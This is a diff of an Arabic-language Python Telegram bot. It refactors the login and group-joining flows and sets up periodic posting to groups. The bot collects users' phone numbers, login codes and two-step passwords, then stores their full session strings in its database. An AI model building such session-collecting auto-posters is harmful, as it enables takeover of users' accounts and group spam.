@@ -89,146 +89,140 @@ async def callback_handler(event):
     else:
         await event.answer("خيار غير معروف!")
 
-# عملية تسجيل الدخول (الحل النهائي)
+# عملية تسجيل الدخول باستخدام المحادثة (الحل النهائي)
 async def login(event):
     # إعادة تعيين حالة المستخدم
     c.execute("UPDATE users SET session = NULL WHERE user_id = ?", (event.sender_id,))
     conn.commit()
     
-    await event.edit(
-        "📱 أرسل رقم هاتفك مع رمز الدولة (مثال: +20123456789)",
-        buttons=back_keyboard()
-    )
-    
-    try:
-        # استقبال رقم الهاتف باستخدام طريقة موثوقة
-        phone = await wait_for_user_response(event.client, event.sender_id, 300)
-        if not phone:
-            return
-            
-        if not re.match(r'^\+\d{10,15}$', phone):
-            await event.respond("❌ رقم غير صحيح! أعد المحاولة", buttons=back_keyboard())
-            return
-        
-        # حفظ رقم الهاتف مؤقتاً
-        c.execute("INSERT OR REPLACE INTO users (user_id, phone) VALUES (?, ?)", 
-                 (event.sender_id, phone))
-        conn.commit()
-        
-        # إنشاء جلسة جديدة
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        
-        # إرسال رمز التحقق
+    async with bot.conversation(event.sender_id) as conv:
         try:
-            await client.send_code_request(phone)
-            await event.respond(
-                f"✅ تم إرسال رمز التحقق إلى {phone}\n"
-                "🔢 أرسل الرمز الآن (5 أرقام)\n"
-                "⏱ لديك 5 دقائق لإدخال الرمز",
+            await conv.send_message(
+                "📱 أرسل رقم هاتفك مع رمز الدولة (مثال: +20123456789)",
                 buttons=back_keyboard()
             )
-        except FloodWaitError as fwe:
-            await event.respond(
-                f"⏳ يجب الانتظار {fwe.seconds} ثانية قبل إعادة المحاولة",
+            
+            # استقبال رقم الهاتف
+            phone_response = await conv.get_response()
+            phone = phone_response.text.strip()
+            
+            if not re.match(r'^\+\d{10,15}$', phone):
+                await conv.send_message("❌ رقم غير صحيح! أعد المحاولة", buttons=back_keyboard())
+                return
+            
+            # حفظ رقم الهاتف مؤقتاً
+            c.execute("INSERT OR REPLACE INTO users (user_id, phone) VALUES (?, ?)", 
+                     (event.sender_id, phone))
+            conn.commit()
+            
+            # إنشاء جلسة جديدة
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
+            
+            # إرسال رمز التحقق
+            try:
+                await client.send_code_request(phone)
+                await conv.send_message(
+                    f"✅ تم إرسال رمز التحقق إلى {phone}\n"
+                    "🔢 أرسل الرمز الآن (5 أرقام)\n"
+                    "⏱ لديك 5 دقائق لإدخال الرمز",
+                    buttons=back_keyboard()
+                )
+            except FloodWaitError as fwe:
+                await conv.send_message(
+                    f"⏳ يجب الانتظار {fwe.seconds} ثانية قبل إعادة المحاولة",
+                    buttons=main_keyboard()
+                )
+                return
+            except PhoneNumberInvalidError:
+                await conv.send_message("❌ رقم الهاتف غير صالح", buttons=main_keyboard())
+                return
+            except Exception as e:
+                await conv.send_message(f"❌ خطأ غير متوقع: {str(e)}", buttons=main_keyboard())
+                return
+            
+            # استقبال رمز التحقق
+            code_response = await conv.get_response()
+            code = code_response.text.strip().replace(' ', '')
+            
+            if not code.isdigit() or len(code) != 5:
+                await conv.send_message("❌ رمز غير صحيح! يجب أن يكون 5 أرقام", buttons=back_keyboard())
+                return
+            
+            # تسجيل الدخول بالرمز
+            try:
+                await client.sign_in(phone, code=code)
+            except SessionPasswordNeededError:
+                await conv.send_message("🔒 الحساب محمي بكلمة مرور، أرسل كلمة المرور الآن:")
+                
+                # استقبال كلمة المرور
+                password_response = await conv.get_response()
+                password = password_response.text
+                await client.sign_in(password=password)
+            
+            # حفظ الجلسة
+            session_str = client.session.save()
+            c.execute("UPDATE users SET session = ? WHERE user_id = ?", 
+                     (session_str, event.sender_id))
+            conn.commit()
+            
+            # التحقق من تسجيل الدخول
+            me = await client.get_me()
+            await conv.send_message(
+                f"✅ تم تسجيل الدخول بنجاح باسم: {me.first_name}",
                 buttons=main_keyboard()
             )
-            return
-        except PhoneNumberInvalidError:
-            await event.respond("❌ رقم الهاتف غير صالح", buttons=main_keyboard())
-            return
+            
+        except asyncio.TimeoutError:
+            await conv.send_message("❌ انتهى الوقت! أعد العملية من البداية", buttons=main_keyboard())
         except Exception as e:
-            await event.respond(f"❌ خطأ غير متوقع: {str(e)}", buttons=main_keyboard())
-            return
-        
-        # استقبال رمز التحقق
-        code = await wait_for_user_response(event.client, event.sender_id, 300)
-        if not code:
-            return
-            
-        code = code.strip().replace(' ', '')
-        
-        if not code.isdigit() or len(code) != 5:
-            await event.respond("❌ رمز غير صحيح! يجب أن يكون 5 أرقام", buttons=back_keyboard())
-            return
-        
-        # تسجيل الدخول بالرمز
-        try:
-            await client.sign_in(phone, code=code)
-        except SessionPasswordNeededError:
-            await event.respond("🔒 الحساب محمي بكلمة مرور، أرسل كلمة المرور الآن:")
-            
-            # استقبال كلمة المرور
-            password = await wait_for_user_response(event.client, event.sender_id, 120)
-            if not password:
-                return
-                
-            await client.sign_in(password=password)
-        
-        # حفظ الجلسة
-        session_str = client.session.save()
-        c.execute("UPDATE users SET session = ? WHERE user_id = ?", 
-                 (session_str, event.sender_id))
-        conn.commit()
-        
-        # التحقق من تسجيل الدخول
-        me = await client.get_me()
-        await event.respond(
-            f"✅ تم تسجيل الدخول بنجاح باسم: {me.first_name}",
-            buttons=main_keyboard()
-        )
-    
-    except asyncio.TimeoutError:
-        await event.respond("❌ انتهى الوقت! أعد العملية من البداية", buttons=main_keyboard())
-    except Exception as e:
-        await event.respond(f"❌ خطأ غير متوقع: {str(e)}", buttons=main_keyboard())
+            await conv.send_message(f"❌ خطأ غير متوقع: {str(e)}", buttons=main_keyboard())
 
-# إضافة مجموعات سوبر (الحل النهائي)
+# إضافة مجموعات سوبر باستخدام المحادثة (الحل النهائي)
 async def add_super(event):
-    await event.edit(
-        "🔗 أرسل رابط الدعوة للمجموعة (يجب أن تكون رابط دعوة صالح)",
-        buttons=back_keyboard()
-    )
-    
-    try:
-        invite_link = await wait_for_user_response(event.client, event.sender_id, 120)
-        if not invite_link:
-            return
-            
-        invite_link = invite_link.strip()
-        
-        # استخراج الهاش من الرابط
-        hash_match = re.search(r'\+(\w+)', invite_link) or re.search(r't.me/joinchat/(\w+)', invite_link)
-        if not hash_match:
-            await event.respond("❌ رابط غير صالح!", buttons=back_keyboard())
-            return
-        
-        invite_hash = hash_match.group(1)
-        
-        # الانضمام للمجموعة
-        client = await get_user_client(event.sender_id)
-        if not client:
-            await event.respond("❌ يجب تسجيل الدخول أولاً!", buttons=main_keyboard())
-            return
-        
+    async with bot.conversation(event.sender_id) as conv:
         try:
-            result = await client(ImportChatInviteRequest(hash=invite_hash))
+            await conv.send_message(
+                "🔗 أرسل رابط الدعوة للمجموعة (يجب أن تكون رابط دعوة صالح)",
+                buttons=back_keyboard()
+            )
             
-            # حفظ المجموعة
-            if result.chats:
-                c.execute("INSERT OR IGNORE INTO groups (group_id, user_id, title) VALUES (?, ?, ?)",
-                         (result.chats[0].id, event.sender_id, result.chats[0].title))
-                conn.commit()
-                
-                await event.respond(f"✅ تم إضافة المجموعة: {result.chats[0].title}", buttons=main_keyboard())
-            else:
-                await event.respond("❌ لم يتم العثور على المجموعة", buttons=main_keyboard())
-                
-        except Exception as e:
-            await event.respond(f"❌ خطأ في الانضمام: {str(e)}", buttons=main_keyboard())
+            # استقبال رابط الدعوة
+            invite_response = await conv.get_response()
+            invite_link = invite_response.text.strip()
             
-    except asyncio.TimeoutError:
-        await event.respond("❌ انتهى الوقت! أعد المحاولة", buttons=main_keyboard())
+            # استخراج الهاش من الرابط
+            hash_match = re.search(r'\+(\w+)', invite_link) or re.search(r't.me/joinchat/(\w+)', invite_link)
+            if not hash_match:
+                await conv.send_message("❌ رابط غير صالح!", buttons=back_keyboard())
+                return
+            
+            invite_hash = hash_match.group(1)
+            
+            # الانضمام للمجموعة
+            client = await get_user_client(event.sender_id)
+            if not client:
+                await conv.send_message("❌ يجب تسجيل الدخول أولاً!", buttons=main_keyboard())
+                return
+            
+            try:
+                result = await client(ImportChatInviteRequest(hash=invite_hash))
+                
+                # حفظ المجموعة
+                if result.chats:
+                    c.execute("INSERT OR IGNORE INTO groups (group_id, user_id, title) VALUES (?, ?, ?)",
+                             (result.chats[0].id, event.sender_id, result.chats[0].title))
+                    conn.commit()
+                    
+                    await conv.send_message(f"✅ تم إضافة المجموعة: {result.chats[0].title}", buttons=main_keyboard())
+                else:
+                    await conv.send_message("❌ لم يتم العثور على المجموعة", buttons=main_keyboard())
+                    
+            except Exception as e:
+                await conv.send_message(f"❌ خطأ في الانضمام: {str(e)}", buttons=main_keyboard())
+                
+        except asyncio.TimeoutError:
+            await conv.send_message("❌ انتهى الوقت! أعد المحاولة", buttons=main_keyboard())
 
 # بدء النشر الدوري
 async def start_publishing(event, interval_data):
@@ -245,13 +239,7 @@ async def start_publishing(event, interval_data):
     c.execute("INSERT OR IGNORE INTO stats (user_id, publish_count) VALUES (?, 1)", (user_id,))
     conn.commit()
     
-    # هنا يمكنك إضافة وظيفة النشر الفعلية
-    # مثال: 
-    # while True:
-    #     await publish_to_groups(user_id)
-    #     await asyncio.sleep(minutes * 60)
-    
-    # إشعار تجريبي
+    # إشعار بدء النشر
     await asyncio.sleep(2)
     await event.respond(f"✅ تم بدء النشر بنجاح بفاصل {minutes} دقيقة", buttons=main_keyboard())
 
@@ -328,28 +316,6 @@ async def back_to_main(event):
         "🏠 القائمة الرئيسية:",
         buttons=main_keyboard()
     )
-
-# دالة جديدة لانتظار رد المستخدم (الحل النهائي)
-async def wait_for_user_response(client, user_id, timeout):
-    try:
-        # استخدام حلقة انتظار فعالة
-        future = asyncio.Future()
-        
-        @client.on(events.NewMessage(from_id=user_id))
-        async def handler(msg_event):
-            if not future.done():
-                future.set_result(msg_event.text)
-                client.remove_event_handler(handler)
-        
-        # انتظار النتيجة مع مهلة زمنية
-        return await asyncio.wait_for(future, timeout=timeout)
-    
-    except asyncio.TimeoutError:
-        await client.send_message(user_id, "❌ انتهى الوقت! أعد المحاولة")
-        return None
-    except Exception as e:
-        await client.send_message(user_id, f"❌ خطأ غير متوقع: {str(e)}")
-        return None
 
 if __name__ == '__main__':
     print("Bot is running...")
